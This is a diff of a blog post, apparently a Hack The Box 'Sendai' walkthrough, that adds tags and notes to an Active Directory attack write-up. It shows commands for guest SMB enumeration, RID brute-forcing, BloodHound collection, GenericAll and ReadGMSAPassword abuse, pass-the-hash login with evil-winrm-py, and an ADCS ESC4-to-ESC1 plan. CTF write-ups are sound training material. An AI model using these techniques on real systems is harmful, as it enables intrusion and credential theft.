@@ -8,7 +8,18 @@ tags:
   - blog
   - HTB
   - windows
-lastmod: 2026-04-26T07:13:02.652Z
+  - Port53-DNS-Discovery-Host
+  - Port139-135-SMB-anonymous-login
+  - Port139-135-SMB-rid-brute
+  - Bloodhound-Setup-Docker-x86
+  - Bloodhound-Collect-nxc
+  - Bloodhound-vectory-GenericAll
+  - 
+  - Bloodhound-vectory-ReadGMSAPassword
+  - Port5985-winrm-evil-winrm-py
+  - Windows-Privilege-Enumation-Service
+  - Port-unknown-ADCS-ESC4-change-ESC1
+lastmod: 2026-05-06T09:11:43.348Z
 ---
 # Box Info
 
@@ -18,9 +29,7 @@ lastmod: 2026-04-26T07:13:02.652Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
-
-The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)
+### PORT & IP SCAN
 
 ```
 Host is up, received echo-reply ttl 127 (0.19s latency).
@@ -55,7 +64,11 @@ PORT      STATE SERVICE          REASON
 
 ### DNS 53
 
-Found the `sendai.vl DC` with using the netexec and add into the /etc/hosts
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port53-DNS-Discovery-Host" >}} The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `sendai.vl`, and the hostname is `DC`.I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -84,12 +97,17 @@ ff02::2         ip6-allrouters
 
 ### Port 80
 
-Standard windows IIS web server , dont send too much time in here\
+Standard windows IIS web server , dont have too much information in here
+
 ![Pasted image 20260414162450.png](/ob/Pasted%20image%2020260414162450.png)
 
 ### SMB
 
-Allow the `guest` login
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-anonymous-login" >}} It also shows Null auth, but on a DC this will always be true. In this case, guest auth allows for me to list shares as any user:
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -109,7 +127,7 @@ SMB         10.129.214.142  445    DC               SYSVOL                      
 SMB         10.129.214.142  445    DC               Users           READ            
 ```
 
-check the Users with smbclient
+The `sendia` share has a few directories and an `incident.txt` file:
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -149,8 +167,8 @@ If you need assistance or have any questions regarding the password reset proced
 Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.\
 {{< /code >}}
 
-That maybe the hits to use the weak password
-
+That maybe the hits to use the weak password\
+There are accounts with weak passwords that have been expired and will need to change their passwords on next login.\
 `guidelines.txt`\
 {{< code >}}\
 Company: Sendai\
@@ -336,7 +354,11 @@ SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:
                                                                                                                     
 ```
 
-Also use the rid to brute-force in SMB
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-rid-brute" >}} I’ll also brute for RIDs to get a list of usernames and found valid account with same account and same password, noted the STATUS\_PASSWORD\_MUST\_CHANGE that we can update the password with impacket-changepasswd
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -609,7 +631,7 @@ Current password:
 [*] Password was changed successfully.
 ```
 
-back to  thomas.powell 's smb shares
+back to thomas.powell 's smb shares
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -666,6 +688,12 @@ That is the wrong path
 Can i use the thomas.powell to do the bloodhound ?
 
 ### Bloodhound Docker Setup
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Setup-Docker-x86" >}} Install the Docker which is matched to install docker-bloodhound
+
+{{< /toggle >}}
 
 #### Docker Setup
 
@@ -762,6 +790,12 @@ bloodhound-cli-linux-amd64.tar.gz                          100%[================
 
 ### Collect data
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Collect-nxc" >}} Collect the data with netexec
+
+{{< /toggle >}}
+
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─# netexec ldap DC.sendai.vl  -u thomas.powell   -p 'Password1' --bloodhound -c All --dns-server 10.129.234.66 
@@ -773,6 +807,14 @@ LDAP        10.129.234.66   389    DC               Compressing output into /roo
 ```
 
 go to http://127.0.0.1:8080/ui/login
+
+### Bloodhound-vectory
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-GenericAll" >}} Using the Cypher in bloodhound to find the short paths Owned object to Tier to Zero to know the GenericALL to admsvc Group
+
+{{< /toggle >}}
 
 set Thomas.Powell to owned\
 ![Pasted image 20260415155333.png](/ob/Pasted%20image%2020260415155333.png)
@@ -795,6 +837,12 @@ Abusing the GenericAll to add thomas.powell into the admsvc group
 ```
 
 Abusing the ReadGMSAPassword
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-ReadGMSAPassword" >}} Abusing the ReadGMSAPassword by the netexec with gmsa to get the NTLM ,and the account should be in the Remote group , so allow winrm login .
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -829,6 +877,14 @@ WINRM       10.129.234.66   5985   DC               [-] sendai.vl\mgtsvc$:a18c6d
 
 successful in
 
+### evil-winrm-py
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port5985-winrm-evil-winrm-py" >}} using the evil-winrm-py login with the hash
+
+{{< /toggle >}}
+
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─# evil-winrm-py -i DC.sendai.vl  -u mgtsvc$  -H a18c6df2768f173d38b4dd073f5436b5
@@ -854,7 +910,7 @@ fff335936142d21a6fa44123b897cd3e
 
 ### Shell As admin
 
-check point ,`C:\Program Files (x86)` , `mgtsvc$’s home directory`
+`EC2Launch` and `EC2LaunchService` are interesting. I don’t know if this box originally on VulnLab ran in EC2, and it’s like HTB machines all having VMWare Tools. There’s a process called `helpdesk`:
 
 ```
 evil-winrm-py PS C:\Program Files (x86)> Get-Process
@@ -1058,7 +1114,12 @@ AI can give me that
 
 ### helpdisk
 
-There are three `MicrosoftEdgeUpdate` processes.
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-Enumation-Service" >}} This account doesn’t have permissions to `Get-Service`, but I can look at the service-related registry keys. The Edge and EC2 ones are there running from their installation directories to find that having credentials in the command:\
+{{< /toggle >}}
+
+This account doesn’t have permissions to `Get-Service`, but I can look at the service-related registry keys. The Edge and EC2 ones are there running from their installation directories:
 
 ```
 Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String ec2
@@ -1067,6 +1128,8 @@ Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty |
 ```
 Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String MicrosoftEdge
 ```
+
+The helpdesk one is in `C:\Windows`, but more interestingly seems to have credentials in the command:
 
 ```
 evil-winrm-py PS C:\Users\mgtsvc$> Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty |
@@ -1099,7 +1162,13 @@ Clifford.Davey is a member of the CA-Operators group:
 ![Pasted image 20260419004012.png](/ob/Pasted%20image%2020260419004012.png)\
 Identifying the CA , maybe i can use the
 
-### EC4 chnage to EC1
+### EC4 change to EC1
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port-unknown-ADCS-ESC4-change-ESC1" >}} Identifying the Clifford.Davey is a member of the CA-Operators group , the CA is the hints to find the vuln of ESC4 , but i want to change to ESC1 for more easy exploited
+
+{{< /toggle >}}
 
 It found the EC4 is vulnerable
 
